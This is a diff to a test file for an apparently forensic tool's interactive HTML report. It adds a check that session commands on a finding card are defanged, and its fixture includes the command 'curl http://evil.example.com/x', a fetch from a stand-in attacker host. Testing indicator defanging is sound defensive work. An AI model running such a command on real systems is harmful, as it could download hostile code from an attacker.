@@ -436,3 +436,26 @@ describe("renderInteractiveHtmlReport indicator defanging (#892)", () => {
     expect(blobSource(html)).toContain("hxxp://203[.]0[.]113[.]10/a.sh");
   });
 });
+
+describe("renderInteractiveHtmlReport — session-command note (#1594)", () => {
+  it("carries each noted command as one defanged line on its finding card", () => {
+    const state = emptyState("c1");
+    state.forensicTimeline.push(ev("e1", "Low", "ws01"));
+    state.findings.push({
+      ...finding("f1", "High", 90),
+      sessionCommands: [
+        {
+          eventId: "e1",
+          timestamp: "2026-05-01T00:00:00Z",
+          host: "ws01",
+          kind: "process",
+          text: "curl http://evil.example.com/x",
+        },
+      ],
+    });
+    const card = parseBlob(renderInteractiveHtmlReport(state, caseMeta, emptyReportMeta())).findings[0];
+    expect(card.sessionCommands).toHaveLength(1);
+    expect(card.sessionCommands[0]).toMatch(/^2026-05-01T00:00:00Z on ws01: curl hxxp/);
+    expect(card.sessionCommands[0]).not.toContain("http://");
+  });
+});
